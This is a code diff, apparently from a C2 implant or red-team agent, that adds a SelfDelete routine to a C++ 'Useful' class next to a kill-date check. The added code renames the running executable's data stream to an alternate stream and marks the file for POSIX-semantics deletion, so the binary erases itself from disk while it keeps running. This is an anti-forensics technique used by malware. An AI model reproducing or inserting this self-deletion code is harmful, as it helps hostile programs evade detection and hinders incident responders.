@@ -303,7 +303,49 @@ auto DECLFN Useful::SecSize(
 } 
 
 auto DECLFN Useful::SelfDelete( VOID ) -> BOOL {
+    WCHAR path[MAX_PATH*2];
+    if ( ! Self->Krnl32.GetModuleFileNameW( nullptr, path, sizeof( path ) ) ) {
+        return EXIT_FAILURE;
+    }
 
+    auto FileHandle = Self->Krnl32.CreateFileW( 
+        path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 
+        nullptr, OPEN_EXISTING, 0, nullptr 
+    );
+    if (FileHandle == INVALID_HANDLE_VALUE) {
+        return FALSE;
+    }
+
+    const auto NewStream  = L":redxvz";
+    const auto StreamSize = Str::LengthW( NewStream ) * sizeof(WCHAR);
+    const auto RenameSize = sizeof(FILE_RENAME_INFO) + StreamSize;
+    const auto RenamePtr  = (PFILE_RENAME_INFO)Self->Hp->Alloc( RenameSize ); 
+    if ( !RenamePtr ) { return FALSE; }
+
+    RenamePtr->FileNameLength = StreamSize;
+    Mem::Copy( RenamePtr->FileName, (PVOID)NewStream, StreamSize );
+    if ( ! Self->Krnl32.SetFileInformationByHandle(FileHandle, FileRenameInfo, RenamePtr, RenameSize) ) {
+        return FALSE;
+    }
+
+    Self->Ntdll.NtClose(FileHandle);
+
+    FileHandle = Self->Krnl32.CreateFileW(
+        path, DELETE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_DELETE, 
+        nullptr, OPEN_EXISTING, 0, nullptr
+    );
+
+    FILE_DISPOSITION_INFO_EX info = { FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS };
+    if ( ! Self->Krnl32.SetFileInformationByHandle(FileHandle, static_cast<FILE_INFO_BY_HANDLE_CLASS>(FileDispositionInfoEx), &info, sizeof(info))) {
+        return FALSE;
+    }
+
+    KhDbg("[+] Self file deletion succefully\n");
+
+    Self->Ntdll.NtClose(FileHandle);
+    if ( RenamePtr ) Self->Hp->Free( RenamePtr );
+
+    return TRUE;
 }
 
 auto DECLFN Useful::CheckKillDate( VOID ) -> VOID {
